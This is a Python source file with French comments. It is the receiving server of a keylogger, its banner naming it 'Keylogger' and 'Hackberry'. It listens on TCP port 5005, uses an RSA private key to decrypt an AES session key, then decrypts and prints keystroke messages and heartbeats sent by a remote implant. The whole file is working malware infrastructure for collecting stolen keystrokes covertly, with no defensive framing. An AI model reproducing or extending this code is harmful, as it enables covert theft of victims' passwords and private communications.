import socket
import base64
from cryptography.hazmat.primitives import serialization, hashes, padding as sym_padding
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

PORT = 5005

ORANGE = "\033[38;5;208m" 
RESET = "\033[0m"

header = f"""{ORANGE}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃    ⌨️  Keylogger – Listening on TCP/{PORT}            ┃
┃                  -> Hackberry  📡                  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{RESET}
"""

print(header)

# Charger la clé privée RSA
with open("private.pem", "rb") as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

def decrypt_aes_key(enc_key_b64):
    encrypted_key = base64.b64decode(enc_key_b64)
    return private_key.decrypt(
        encrypted_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def decrypt_aes(ciphertext, key):
    iv = ciphertext[:16]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext[16:]) + decryptor.finalize()
    unpadder = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
    return unpadder.update(padded) + unpadder.finalize()

def recvall(sock, n):
    data = b''
    while len(data) < n:
        part = sock.recv(n - len(data))
        if not part:
            break
        data += part
    return data

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock:
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(('0.0.0.0', PORT))
    server_sock.listen(1)
    print(f"[SERVER] En attente de la clé AES...")

    conn, addr = server_sock.accept()
    print(f"[SERVER] Connexion de {addr[0]}")

    # Réception clé AES
    key_len = int.from_bytes(recvall(conn, 4), 'big')
    enc_key_b64 = recvall(conn, key_len)
    aes_key = decrypt_aes_key(enc_key_b64)
    print("[SERVER] Clé AES reçue et déchiffrée")

    while True:
        try:
            header = recvall(conn, 4)
            if not header:
                print("[SERVER] Connexion fermée.")
                break
            msg_len = int.from_bytes(header, 'big')
            data = recvall(conn, msg_len)
            if not data:
                break

            cipher_bytes = base64.b64decode(data)
            message = decrypt_aes(cipher_bytes, aes_key).decode(errors="replace")

            if message == "PING":
                print(f"[{addr[0]}] ❤️  Heartbeat reçu")
            else:
                print(f"[{addr[0]}] > {message}")
        except Exception as e:
            print(f"[SERVER] ❌ Erreur: {e}")
            break

    print("[SERVER] Connexion terminée.")

